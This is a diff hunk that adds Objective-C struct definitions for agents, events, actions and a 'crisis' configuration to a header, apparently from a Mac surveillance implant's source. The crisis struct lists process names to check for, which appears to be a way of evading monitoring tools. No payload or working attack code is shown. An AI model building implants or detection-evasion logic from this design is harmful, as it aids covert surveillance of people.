@@ -19,6 +19,45 @@
 #import "RCSMEncryption.h"
 #import "RCSMCommon.h"
 
+typedef struct _agent {
+  u_int   agentID;
+  u_int   status;  // Running, Stopped
+  u_int   internalDataSize;
+  //void *pParams;
+  NSData  *internalData;
+  void    *pFunc;        // Thread start routine
+  u_int   command;
+} agentStruct;
+
+typedef struct _event {
+  u_int   type;
+  u_int   actionID;
+  u_int   internalDataSize;
+  NSData  *internalData;
+  void    *pFunc;
+  u_int   status;
+  u_int   command;     // Used for communicate within the monitor
+} eventStruct;
+
+typedef struct _action {
+  u_int   type;
+  u_int   internalDataSize;
+  NSData  *internalData;
+} actionStruct;
+
+typedef struct _actionContainer {
+  u_int numberOfSubActions;
+} actionContainerStruct;
+
+typedef struct {
+  UInt32  unused;
+  UInt32  check_network;
+  UInt32  check_system;
+  UInt32  network_process_count;
+  UInt32  system_process_count;
+  char    process_names[1];
+} crisisConfStruct;
+
 //
 // Only used if there's no other name to use
 //
